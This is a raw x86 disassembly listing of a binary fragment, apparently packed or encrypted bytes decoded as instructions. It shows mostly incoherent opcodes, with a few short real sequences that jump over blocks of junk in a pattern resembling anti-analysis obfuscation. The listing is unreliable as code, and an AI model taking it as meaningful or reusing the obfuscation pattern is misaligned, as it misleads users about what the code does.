  4019a0:	mov    BYTE PTR [ebp+0x47c6c816],bl
  4019a6:	popf   
  4019a7:	mov    edx,0xe34a07b0
  4019ac:	cmc    
  4019ad:	stos   DWORD PTR es:[edi],eax
  4019ae:	test   ch,al
  4019b0:	sbb    dl,BYTE PTR [edi+0x3f859f84]
  4019b6:	push   es
  4019b7:	or     ch,BYTE PTR [edx+0x69e8e249]
  4019bd:	cmp    al,BYTE PTR [edi-0xa05c468]
  4019c3:	add    BYTE PTR [edi-0x4aa389f9],ch
  4019c9:	pop    ecx
  4019ca:	add    DWORD PTR [esp+esi*2],ecx
  4019cd:	pop    edx
  4019ce:	inc    edx
  4019cf:	pop    esi
  4019d0:	(bad)  
  4019d2:	nop
  4019d3:	dec    ebp
  4019d4:	(bad)  
  4019d5:	cli    
  4019d6:	or     ebp,edx
  4019d8:	stos   DWORD PTR es:[edi],eax
  4019d9:	mov    edi,0x5b8a5f7e
  4019de:	inc    eax
  4019df:	int    0x29
  4019e1:	stc    
  4019e2:	jge    0x4019df
  4019e4:	ss push esp
  4019e6:	shl    ebp,cl
  4019e8:	inc    esi
  4019e9:	mov    ebp,0xbe6309a4
  4019ee:	sbb    bh,0x99
  4019f1:	loopne 0x401a71
  4019f3:	neg    DWORD PTR [ebp+edx*8-0x4d]
  4019f7:	ja     0x4019a5
  4019f9:	pop    edx
  4019fa:	test   DWORD PTR [edx],edi
  4019fc:	(bad)  [ebx+edx*1+0x77f252b8]
  401a03:	jo     0x4019bd
  401a05:	pop    edx
  401a06:	in     al,dx
  401a07:	loopne 0x40198e
  401a09:	les    edx,FWORD PTR [edi-0x444c3419]
  401a0f:	out    0x13,eax
  401a11:	and    DWORD PTR [ebx-0x46365fb2],esi
  401a17:	icebp  
  401a18:	outs   dx,BYTE PTR ds:[esi]
  401a19:	fsubr  DWORD PTR [ebp+0x48]
  401a1c:	es pop esp
  401a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a1f:	inc    esi
  401a20:	adc    eax,edx
  401a22:	xor    DWORD PTR [esi-0xcd52c72],esi
  401a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a29:	pop    eax
  401a2a:	push   ss
  401a2b:	fist   WORD PTR [ebx-0x69fabf74]
  401a31:	jle    0x401a5c
  401a33:	adc    al,0x53
  401a35:	pop    es
  401a36:	jl     0x401ab5
  401a38:	cmp    dh,BYTE PTR [eax]
  401a3a:	int    0x20
  401a3c:	cmp    BYTE PTR [edx+0x15],dh
  401a3f:	pop    edx
  401a40:	jge    0x401a5a
  401a42:	jns    0x401ac1
  401a44:	es jmp 0x651b2aad
  401a4a:	mov    al,dh
  401a4c:	sahf   
  401a4d:	aam    0xe
  401a4f:	xchg   bh,bh
  401a51:	cmp    BYTE PTR [ecx+0xa],ah
  401a54:	mov    ah,0x49
  401a56:	pop    eax
  401a57:	cmp    cl,bh
  401a59:	cmp    DWORD PTR [esi],eax
  401a5b:	mov    ebp,0xfd7faad3
  401a60:	adc    DWORD PTR [edx],edx
  401a62:	test   DWORD PTR [ebp-0x3f16abd0],esp
  401a68:	push   ebp
  401a69:	adc    edx,DWORD PTR [edi-0xf5a1d53]
  401a6f:	jl     0x401a4d
  401a71:	push   ecx
  401a72:	push   esp
  401a73:	and    ebx,DWORD PTR [edi-0x58]
  401a76:	or     DWORD PTR [ecx-0x63164fa3],ecx
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	sub    DWORD PTR [ecx+0x780e3193],0x7ffa7e7e
  401a95:	jle    0x401b15
  401a97:	jne    0x401a60
  401a99:	(bad)  
  401a9b:	and    eax,0x22728d64
  401aa0:	jge    0x401b0c
  401aa2:	sub    eax,0xe8bf3348
  401aa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401aa8:	and    DWORD PTR [eax+0x32],0xffffffd1
  401aac:	jp     0x401ab9
  401aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401aaf:	add    BYTE PTR [ecx+ebx*2],0xe9
  401ab3:	pop    edi
  401ab4:	xchg   ebp,ebx
  401ab6:	push   ebx
  401ab7:	pop    ss
  401ab8:	(bad)  
  401ab9:	fisubr WORD PTR [esi-0x6a79a74b]
  401abf:	xchg   ecx,eax
  401ac0:	(bad)  
  401ac1:	loope  0x401b28
  401ac3:	and    al,0x20
  401ac5:	loopne 0x401a64
  401ac7:	das    
  401ac8:	adc    ebx,eax
  401aca:	inc    ebx
  401acb:	xor    eax,0x3ca3a237
  401ad0:	adc    BYTE PTR [ecx+esi*8],0xe4
  401ad4:	sbb    al,0xa2
  401ad6:	stc    
  401ad7:	jns    0x401b10
  401ad9:	out    dx,al
  401ada:	or     ah,BYTE PTR [eax-0x23]
  401add:	icebp  
  401ade:	xchg   BYTE PTR [edi],ch
  401ae0:	das    
  401ae1:	jg     0x401ad1
  401ae3:	push   es
  401ae4:	out    0x51,eax
  401ae6:	addr16 push esp
  401ae8:	repz pop ds
  401aea:	jnp    0x401ae4
  401aec:	xchg   ebx,eax
  401aed:	test   edx,esi
  401aef:	mov    al,0x2e
  401af1:	add    edi,ebx
  401af3:	out    dx,eax
  401af4:	xchg   esi,eax
  401af5:	das    
  401af6:	sbb    eax,0x54145919
  401afb:	out    0x7c,eax
  401afd:	out    0x40,eax
  401aff:	in     al,dx
  401b00:	adc    al,0x6b
  401b02:	push   0xdb6dbd1d
  401b07:	mov    ch,BYTE PTR [ecx+0x3992416e]
  401b0d:	(bad)  
  401b0e:	inc    esi
  401b0f:	xchg   edx,eax
  401b10:	mov    DWORD PTR [eax-0x48],edi
  401b13:	sti    
  401b14:	push   ebx
  401b15:	or     BYTE PTR [esi-0x2d],al
  401b18:	push   ds
  401b19:	jl     0x401b5c
  401b1b:	mov    edi,0x5a7c5816
  401b20:	xchg   DWORD PTR [edi-0x70],ecx
  401b23:	sti    
  401b24:	adc    al,0xe4
  401b26:	sub    eax,0x50d19173
  401b2b:	ins    DWORD PTR es:[edi],dx
  401b2c:	mov    DWORD PTR [edx],edx
  401b2e:	mov    cl,BYTE PTR [ecx+0x464ece5f]
  401b34:	ins    BYTE PTR es:[edi],dx
  401b35:	or     edx,ebx
  401b37:	bound  edi,QWORD PTR [ecx-0x426f1725]
  401b3d:	cmp    ebx,DWORD PTR [edx]
  401b3f:	out    0xa3,eax
  401b41:	xlat   BYTE PTR ds:[ebx]
  401b42:	mov    ch,0xc5
  401b44:	arpl   WORD PTR [esi+0x69],ax
  401b47:	nop
  401b48:	scas   eax,DWORD PTR es:[edi]
  401b49:	js     0x401b11
  401b4b:	mov    ds,esp
  401b4d:	xor    al,BYTE PTR [eax]
  401b4f:	sbb    BYTE PTR [edx-0x58],bh
  401b52:	sub    al,0x77
  401b54:	dec    ebx
  401b55:	pop    edi
  401b56:	mov    esp,0x3b320c9b
  401b5b:	repz ret 0x1766
  401b5f:	rol    DWORD PTR [ecx+eiz*1-0x6b553456],cl
  401b66:	xor    eax,0xa016651b
  401b6b:	(bad)  
  401b6c:	xchg   esi,eax
  401b6d:	out    dx,al
  401b6e:	mov    ds:0x82c01a6d,al
  401b73:	shl    BYTE PTR [ebx-0x68],0x6f
  401b77:	daa    
  401b78:	ret    
  401b79:	popf   
  401b7a:	mov    al,0x24
  401b7c:	test   DWORD PTR [esp+edi*8],eax
  401b7f:	sbb    BYTE PTR [edi+0x5],dl
  401b82:	es cld 
  401b84:	push   ss
  401b85:	pop    ebp
  401b86:	popf   
  401b87:	cwde   
  401b88:	cmp    cl,BYTE PTR [ebx+0x12]
  401b8b:	aaa    
  401b8c:	out    0xd5,al
  401b8e:	dec    esi
  401b8f:	fcomp  QWORD PTR [edx-0x33]
  401b92:	mov    edx,0xbb98e84f
  401b97:	call   0xe26f:0xbfc11ce0
  401b9e:	pop    ebp
  401b9f:	pop    ss
  401ba0:	xchg   edx,eax
  401ba1:	mov    eax,0xc4bc49db
  401ba6:	pop    edi
  401ba7:	aas    
  401ba8:	outs   dx,DWORD PTR ds:[esi]
  401ba9:	pop    edx
  401baa:	mov    BYTE PTR [eax+eax*8],al
  401bad:	rcl    DWORD PTR [edx+0x3d],1
  401bb0:	mov    BYTE PTR [esi-0x70],dh
  401bb3:	std    
  401bb4:	js     0x401b56
  401bb6:	and    BYTE PTR [edi+ecx*8+0x13],ah
  401bba:	into   
  401bbb:	pop    edi
  401bbc:	pop    esi
  401bbd:	or     DWORD PTR [edx+0x40],edx
  401bc0:	ja     0x401b56
  401bc2:	jns    0x401b68
  401bc4:	sbb    ah,BYTE PTR [edi+0x10b63a9a]
  401bca:	fidivr DWORD PTR [eax+0x2c6fe27d]
  401bd0:	xor    al,BYTE PTR [edi-0x6d]
  401bd3:	add    eax,0x35597b82
  401bd8:	test   eax,0x74f5129d
  401bdd:	sub    dh,BYTE PTR [edi-0x3dd530a9]
  401be3:	or     ch,BYTE PTR [ecx]
  401be5:	jmp    0x2a503403
  401bea:	popf   
  401beb:	jne    0x401bfb
  401bed:	popf   
  401bee:	xchg   cl,dh
  401bf0:	and    eax,DWORD PTR [ecx+ecx*8+0x9]
  401bf4:	inc    ebp
  401bf5:	cmp    al,0x7a
  401bf7:	sub    al,0x65
  401bf9:	and    ecx,edi
  401bfb:	enter  0xb6bb,0x54
  401bff:	dec    ebp
  401c00:	adc    BYTE PTR [edx+0x76c6e148],ah
  401c06:	js     0x401bb8
  401c08:	inc    esp
  401c09:	aam    0x57
  401c0b:	pusha  
  401c0c:	fisttp QWORD PTR [ebp+0x59]
  401c0f:	add    bl,al
  401c11:	mov    cs,WORD PTR [edx+ecx*1+0x46]
  401c15:	rol    BYTE PTR [ebp-0x3c],cl
  401c18:	sar    BYTE PTR [ebx],cl
  401c1a:	push   ecx
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	(bad)  
  401c42:	clc    
  401c43:	in     al,dx
  401c44:	mov    bh,BYTE PTR [ecx+0x7e]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c2d
  401c4d:	or     al,0xb5
  401c4f:	aas    
  401c50:	mov    ah,BYTE PTR [edi+0x13d69d48]
  401c56:	jno    0x401ca1
  401c58:	scas   al,BYTE PTR es:[edi]
  401c59:	rol    ah,1
  401c5b:	xchg   ebp,eax
  401c5c:	popa   
  401c5d:	imul   ecx,DWORD PTR [eax-0x774d0a06],0xfffffff4
  401c64:	sub    ecx,DWORD PTR [ebp+0x44ea2bf9]
  401c6a:	mov    al,ds:0xe0f99295
  401c6f:	sub    dl,al
  401c71:	int    0xbf
  401c73:	in     eax,dx
  401c74:	add    ebp,DWORD PTR [edx]
  401c76:	pop    edx
  401c77:	mov    edi,0x60f9bf6a
  401c7c:	add    al,0x70
  401c7e:	pop    esi
  401c80:	leave  
  401c81:	cmc    
  401c82:	inc    eax
  401c83:	mov    esi,0xc9371f06
  401c88:	jg     0x401cff
  401c8a:	pop    ss
  401c8b:	mov    eax,ds:0xe303fe9a
  401c90:	cli    
  401c91:	in     al,0x43
  401c93:	sub    eax,DWORD PTR [edi]
  401c95:	sub    esp,DWORD PTR [esi]
  401c97:	mov    bh,BYTE PTR [edi+0x699f31b1]
  401c9d:	jle    0x401d1d
  401c9f:	pop    esi
  401ca0:	test   BYTE PTR [eax-0x25],al
  401ca3:	sbb    BYTE PTR [ecx],ah
  401ca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ca6:	xchg   ecx,eax
  401ca7:	aad    0x73
  401ca9:	ss pop ss
  401cab:	cmp    al,0x1b
  401cad:	mov    al,ds:0x2edd2621
  401cb2:	hlt    
  401cb3:	push   eax
  401cb4:	ficomp DWORD PTR [eax+0x6c2d4305]
  401cba:	mov    edi,0x92a3b685
  401cbf:	mov    ch,0x92
  401cc1:	call   0xc95d7de
  401cc6:	ja     0x401d2d
  401cc8:	cmp    DWORD PTR [edx],0x3
  401ccb:	push   edx
  401ccc:	dec    eax
  401ccd:	sub    al,0xe6
  401ccf:	xor    ebp,ebp
  401cd1:	xchg   bl,bl
  401cd3:	aaa    
  401cd4:	and    BYTE PTR [edi+0x27e083fb],ah
  401cda:	mov    esi,0xa10dec20
  401cdf:	fnstenv [eax+eiz*4+0x6]
  401ce3:	xlat   BYTE PTR ds:[ebx]
  401ce4:	xor    BYTE PTR [ecx],ch
  401ce6:	aad    0xdb
  401ce8:	ins    DWORD PTR es:[edi],dx
  401ce9:	xchg   edi,eax
  401cea:	add    esp,DWORD PTR ds:0xb781d164
  401cf0:	jge    0x401d2d
  401cf2:	shl    ebx,0xd1
  401cf5:	(bad)  
  401cf7:	rol    BYTE PTR [ebp-0x7da6b66c],cl
  401cfd:	mov    DWORD PTR [esi+0x53],ecx
  401d00:	xor    cl,BYTE PTR [edx]
  401d02:	inc    ecx
  401d03:	neg    BYTE PTR [ecx+0x9c98fd5]
  401d09:	add    DWORD PTR [ebx-0x17],edi
  401d0c:	test   al,0x90
  401d0e:	jg     0x401cae
  401d10:	stos   BYTE PTR es:[edi],al
  401d11:	cld    
  401d12:	mov    bh,0xf5
  401d14:	mov    cl,0x25
  401d16:	sub    BYTE PTR [esi],dh
  401d18:	inc    ebx
  401d19:	pop    edi
  401d1a:	push   eax
  401d1b:	xchg   esi,eax
  401d1c:	stc    
  401d1d:	(bad)  
  401d1e:	cmc    
  401d1f:	push   esi
  401d20:	mov    ecx,0x3958b247
  401d25:	mul    DWORD PTR [ebx]
  401d27:	and    eax,0xa01d40fc
  401d2c:	and    al,0x7e
  401d2e:	mov    esp,0xebb94c58
  401d33:	xor    eax,0xf606c665
  401d38:	xor    ch,bl
  401d3a:	pop    edi
  401d3b:	mov    eax,ds:0x7bbb54a6
  401d40:	jns    0x401d02
  401d42:	not    BYTE PTR ds:0xd65b2875
  401d48:	fimul  WORD PTR [ecx-0x58]
  401d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d4c:	sbb    edx,DWORD PTR [eax+ebp*8]
  401d4f:	and    eax,0x8cc2f4a3
  401d54:	xor    DWORD PTR [eax+0x58e7c03],ecx
  401d5a:	pop    ebx
  401d5b:	adc    esp,DWORD PTR ds:0x9a6ca990
  401d61:	mov    eax,0x6f037efb
  401d66:	pushf  
  401d67:	mul    ebx
  401d69:	dec    eax
  401d6a:	pop    esi
  401d6b:	scas   al,BYTE PTR es:[edi]
  401d6c:	or     ch,BYTE PTR [edx]
  401d6e:	(bad)  
  401d6f:	bound  esi,QWORD PTR [eax]
  401d71:	push   0x74
  401d73:	(bad)  
  401d74:	stc    
  401d75:	xor    al,0x33
  401d77:	test   BYTE PTR [ecx+eiz*2],cl
  401d7a:	ret    0xbf0a
  401d7d:	inc    eax
  401d7e:	cmp    al,0xa7
  401d80:	test   BYTE PTR ds:0xef3f134b,0x47
  401d87:	push   edi
  401d88:	ins    BYTE PTR es:[edi],dx
  401d89:	std    
  401d8a:	and    BYTE PTR [esi+0x9c139f8],al
  401d90:	jns    0x401d30
  401d92:	stos   BYTE PTR es:[edi],al
  401d93:	xor    eax,0x1
  401d96:	jecxz  0x401d7f
  401d98:	cmc    
  401d99:	pop    esi
  401d9a:	jmp    0x81fb:0xa7d6e842
  401da1:	enter  0x1680,0x4e
  401da5:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  401da7:	aas    
  401da8:	sbb    al,0x14
  401daa:	push   eax
  401dab:	(bad)  
  401dac:	out    dx,al
  401dad:	ss cs xor eax,0x156b05fb
  401db4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401db5:	mov    bl,0x9d
  401db7:	pop    esp
  401db8:	out    0x3d,al
  401dba:	and    BYTE PTR [edx+0x65],bh
  401dbd:	and    al,0x84
  401dbf:	mov    ah,0x2d
  401dc1:	push   0x1b5a43d4
  401dc6:	dec    ebx
  401dc7:	out    dx,eax
  401dc8:	ins    DWORD PTR es:[edi],dx
  401dc9:	cmp    BYTE PTR [ebp-0x2e],dl
  401dcc:	mov    BYTE PTR [ecx],bh
  401dce:	jge    0x401e24
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x13d2ccc8],ebp
  401e0d:	or     eax,0x7e7e0716
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401dc1
  401e17:	adc    DWORD PTR [edi-0x29],ecx
  401e1a:	(bad)  
  401e1b:	retf   
  401e1c:	xchg   ebx,eax
  401e1d:	out    dx,al
  401e1e:	shr    edi,1
  401e20:	push   ecx
  401e21:	test   BYTE PTR [edi+0x51],0xb0
  401e25:	sub    BYTE PTR [ebx],al
  401e27:	dec    esi
  401e28:	add    bl,BYTE PTR [eax-0x444629f4]
  401e2e:	jo     0x401dba
  401e30:	aaa    
  401e31:	mov    dl,0x42
  401e33:	rcr    ebx,0x6d
  401e36:	popa   
  401e37:	lock or cl,ch
  401e3a:	push   esp
  401e3b:	cmp    ebx,DWORD PTR [ebp+0x740ceb45]
  401e41:	cmp    esi,DWORD PTR [eax+0x654e3ee]
  401e47:	push   eax
  401e48:	mov    eax,ds:0xa22c0c9
  401e4d:	sub    BYTE PTR [esp+eiz*4-0x58],0xf5
  401e52:	add    ch,BYTE PTR [esp+ecx*4-0x112a649b]
  401e59:	adc    eax,0xfa1ee3c7
  401e5e:	popa   
  401e5f:	or     ecx,DWORD PTR [esp+esi*1+0x52]
  401e63:	add    bh,bh
  401e65:	pop    es
  401e66:	inc    edi
  401e67:	fisub  WORD PTR [edx+0x3c]
  401e6a:	mov    ch,0xf1
  401e6c:	scas   al,BYTE PTR es:[edi]
  401e6d:	cdq    
  401e6e:	aam    0x82
  401e70:	add    ebp,edx
  401e72:	inc    esi
  401e73:	push   ss
  401e74:	xchg   edx,eax
  401e75:	or     ebx,DWORD PTR [eax]
  401e77:	sbb    al,0x55
  401e79:	lds    esp,FWORD PTR [eax]
  401e7b:	dec    esp
  401e7c:	gs or  ebp,0x29
  401e80:	out    dx,al
  401e81:	rcl    esi,1
  401e83:	adc    bl,bh
  401e85:	inc    esp
  401e86:	inc    edx
  401e87:	mov    ch,0xf2
  401e89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e8a:	mov    ebx,edx
  401e8c:	(bad)  
  401e8e:	mov    eax,0xf3353078
  401e93:	(bad)  
  401e95:	dec    eax
  401e96:	int3   
  401e97:	xor    edi,ecx
  401e99:	retf   
  401e9a:	sti    
  401e9b:	ret    
  401e9c:	pop    ss
  401e9d:	call   0x32e55ea9
  401ea2:	shr    dl,cl
  401ea4:	pop    ecx
  401ea5:	test   DWORD PTR [edx-0x6ae19144],edx
  401eab:	mov    WORD PTR [esi+0x6c2d3e95],fs
  401eb1:	sub    al,0x89
  401eb3:	leave  
  401eb4:	sti    
  401eb5:	mov    bl,0x1e
  401eb7:	in     eax,dx
  401eb8:	add    BYTE PTR [eax],dh
  401eba:	mov    ebx,0x753263b8
  401ebf:	in     al,0x7f
  401ec1:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  401ec3:	cmp    al,0x28
  401ec5:	leave  
  401ec6:	retf   0x9e5
  401ec9:	(bad)  
  401eca:	repnz in al,dx
  401ecc:	pop    cx
  401ece:	mov    ebx,ebp
  401ed0:	inc    ecx
  401ed1:	fdivr  st(3),st
  401ed3:	jp     0x401e8b
  401ed5:	ins    BYTE PTR es:[edi],dx
  401ed6:	loop   0x401e5a
  401ed8:	and    eax,0x450591de
  401edd:	jl     0x401e96
  401edf:	clc    
  401ee0:	sub    al,0x15
  401ee2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ee3:	xchg   ebp,eax
  401ee4:	imul   ebx,DWORD PTR [esi+0x57461133],0xb4fc4398
  401eee:	dec    ebx
  401eef:	loopne 0x401f32
  401ef1:	fisttp QWORD PTR [esi+0x36]
  401ef4:	pop    ebp
  401ef5:	xlat   BYTE PTR ds:[ebx]
  401ef6:	or     DWORD PTR [edx+0x25],edx
  401ef9:	inc    edi
  401efa:	sti    
  401efb:	loop   0x401ede
  401efd:	std    
  401efe:	in     al,dx
  401eff:	ud0    edi,DWORD PTR [edi+0x6e6b595c]
  401f06:	mov    bh,0x63
  401f08:	sar    BYTE PTR [eax],cl
  401f0a:	(bad)
  401f0e:	daa    
  401f0f:	mov    bl,0x53
  401f11:	lods   al,BYTE PTR ds:[esi]
  401f12:	dec    esp
  401f13:	or     al,0x56
  401f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f16:	stos   BYTE PTR es:[edi],al
  401f17:	pop    ebp
  401f18:	dec    ebx
  401f19:	and    al,0x27
  401f1b:	add    al,0x55
  401f1d:	jmp    0x2278:0xeeba9d74
  401f24:	inc    ebp
  401f25:	cmp    ebx,esi
  401f27:	loop   0x401ec4
  401f29:	mov    cl,0x1a
  401f2b:	xchg   esp,eax
  401f2c:	frstor [eax]
  401f2e:	or     bh,BYTE PTR ds:0xdb4e7ea0
  401f34:	inc    ebx
  401f35:	rcr    DWORD PTR [bp+di],0xd1
  401f39:	ror    BYTE PTR [ecx+ecx*4-0x6f916a56],cl
  401f40:	lahf   
  401f41:	lods   eax,DWORD PTR ds:[esi]
  401f42:	data16 (bad) 
  401f44:	iret   
  401f45:	stc    
  401f46:	adc    esi,esp
  401f48:	shr    DWORD PTR [edx+0x45f08c5c],1
  401f4e:	hlt    
  401f4f:	xchg   edi,eax
  401f50:	ss test eax,0x5019bda0
  401f56:	cmc    
  401f57:	pop    ds
  401f58:	ds loope 0x401f07
  401f5b:	sub    eax,DWORD PTR [edi-0x15]
  401f5e:	pop    ecx
  401f5f:	xor    BYTE PTR [ecx+0x5c0e82d0],ah
  401f65:	xchg   ebx,eax
  401f66:	fchs   
  401f68:	add    esi,DWORD PTR [esi]
  401f6a:	(bad)  
  401f6b:	inc    BYTE PTR cs:[esi]
  401f6e:	shl    DWORD PTR [edx-0x19a321b8],cl
  401f74:	mov    ds:0x41d86536,eax
  401f79:	inc    esi
  401f7a:	pop    ebp
  401f7b:	dec    ebp
  401f7c:	inc    ecx
  401f7d:	inc    eax
  401f7e:	lds    ecx,FWORD PTR ds:0x6e845289
  401f84:	add    eax,0x243e6aa7
  401f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f8a:	int3   
  401f8b:	gs (bad) 
  401f8d:	test   al,0xdb
  401f8f:	mov    esp,0xf28f5e15
  401f94:	in     eax,0x8d
  401f96:	aad    0xc7
  401f98:	test   eax,0x6d840fea
  401f9d:	add    eax,DWORD PTR [eax]
  401f9f:	add    BYTE PTR [ebp-0x977b],cl
  401fa5:	call   DWORD PTR [eax-0x75]
  401fa8:	inc    ebp
  401fa9:	in     al,0x33
  401fab:	mov    BYTE PTR [ebx],0xc7
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xc826976b
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x40203b
  401fcc:	stos   BYTE PTR es:[edi],al
  401fcd:	inc    esp
  401fce:	(bad)  [eax+0x11]
  401fd1:	add    DWORD PTR [edi],edx
  401fd3:	ins    BYTE PTR es:[edi],dx
  401fd4:	imul   edi,DWORD PTR [edx-0x3],0x32e4af39
  401fdb:	push   ecx
  401fdc:	addr16 mov ebx,0x48fdab90
  401fe2:	lea    eax,[eax]
  401fe4:	nop
  401fe5:	add    eax,DWORD PTR [eax-0x22]
  401fe8:	jmp    0x8546:0xf8b33fb2
  401fef:	or     ecx,DWORD PTR [edi+0x7db41b54]
  401ff5:	jecxz  0x401fee
  401ff7:	dec    ebx
  401ff8:	cdq    
  401ff9:	int    0x21
  401ffb:	cmp    bh,bl
  401ffd:	dec    edx
  401ffe:	or     DWORD PTR fs:[edi+0x17],esi
  402002:	in     al,0xb5
  402004:	jnp    0x401fec
  402006:	inc    edi
  402007:	jb     0x402050
  402009:	xchg   ebx,eax
  40200a:	icebp  
  40200b:	daa    
  40200c:	(bad)  
  40200d:	ins    BYTE PTR es:[edi],dx
  40200e:	adc    al,0x4f
  402010:	ror    DWORD PTR [ebp+0x4f0a19aa],cl
  402016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402017:	or     DWORD PTR [esi],esi
  402019:	loopne 0x40207f
  40201b:	(bad)  
  40201d:	jge    0x401feb
  40201f:	(bad)  
  402020:	std    
  402021:	out    0x2,al
  402023:	push   ebx
  402024:	push   ecx
  402025:	jp     0x40204b
  402027:	stos   DWORD PTR es:[edi],eax
  402028:	xchg   BYTE PTR [esi],cl
  40202a:	push   ecx
  40202b:	push   ebx
  40202c:	xchg   ebp,eax
  40202d:	ficom  WORD PTR [edx]
  40202f:	sbb    DWORD PTR [esi-0x41256695],esp
  402035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402036:	push   ecx
  402037:	and    eax,0xce076683
  40203c:	test   al,0xf
  40203e:	push   ebp
  40203f:	sbb    BYTE PTR [edi+eiz*4],cl
  402042:	fild   WORD PTR [eax+0x7]
  402045:	pop    ebp
  402046:	jo     0x402057
  402048:	mov    DWORD PTR [esi],ecx
  40204a:	or     BYTE PTR [edi],cl
  40204c:	mov    ds:0xc6e45c1b,al
  402051:	loope  0x40206c
  402053:	push   ecx
  402054:	retf   
  402055:	and    al,0xe6
  402057:	call   0x7a64c759
  40205c:	pop    esi
  40205d:	out    0x30,eax
  40205f:	in     eax,dx
  402060:	adc    al,0x83
  402062:	bnd jns 0x4020bc
  402065:	iret   
  402066:	loopne 0x40202e
  402068:	and    eax,0x8c2b9b93
  40206d:	std    
  40206e:	cmp    BYTE PTR [edi+0x7cadf0ce],al
  402074:	add    ah,bl
  402076:	pop    ds
  402077:	sbb    DWORD PTR [edi],esi
  402079:	mov    esp,0xc78b47f6
  40207e:	mov    ecx,0x11d8e152
  402083:	mov    ch,0x30
  402085:	bound  ebx,QWORD PTR [esi-0x52]
  402088:	mov    dh,0xb3
  40208a:	pop    ebp
  40208b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40208c:	ror    BYTE PTR [ecx+0x51],cl
  40208f:	pop    esi
  402090:	div    eax
  402092:	icebp  
  402093:	jbe    0x4020ca
  402095:	stos   DWORD PTR es:[edi],eax
  402096:	and    BYTE PTR [eax+0x5e],bl
  402099:	xor    DWORD PTR [edi-0x76],edi
  40209c:	aad    0xa
  40209e:	js     0x402118
  4020a0:	or     ebp,DWORD PTR [edx-0x1b]
  4020a3:	sbb    cl,BYTE PTR [ebx+0x15]
  4020a6:	ds jge 0x402055
  4020a9:	fbld   TBYTE PTR [ebp+0x30]
  4020ac:	imul   esi,DWORD PTR [edx-0x6b99a3fe],0xffffff8e
  4020b3:	inc    eax
  4020b4:	sub    al,BYTE PTR [edx+edi*8-0x43]
  4020b8:	(bad)
  4020bb:	call   DWORD PTR [edx+esi*8+0x66fa1f7c]
  4020c2:	icebp  
  4020c3:	and    ebx,DWORD PTR [ecx-0x39]
  4020c6:	aas    
  4020c7:	sbb    BYTE PTR [eax],dl
  4020c9:	bound  eax,QWORD PTR [esi-0x1f6ca689]
  4020cf:	push   edx
  4020d0:	xchg   ebx,eax
  4020d1:	lahf   
  4020d2:	push   0x76726d92
  4020d7:	pop    esp
  4020d8:	test   al,0x8b
  4020da:	add    DWORD PTR ds:0x878b805,0x3a
  4020e1:	xor    DWORD PTR [ecx+0x20c6dbb0],ecx
  4020e7:	mov    ebx,DWORD PTR [ecx+esi*2]
  4020ea:	xchg   edx,eax
  4020eb:	js     0x4020e7
  4020ed:	frstor [eax-0x5d]
  4020f0:	sbb    ebx,eax
  4020f2:	pop    es
  4020f3:	pop    eax
  4020f4:	mov    ecx,0x16e18d4f
  4020f9:	test   al,0xc5
  4020fb:	mov    edx,0x25647bf8
  402100:	add    eax,0xa1a84b6d
  402105:	retf   
  402106:	push   0x40f88c5f
  40210b:	dec    edx
  40210c:	stos   DWORD PTR es:[edi],eax
  40210d:	dec    ebp
  40210e:	ret    
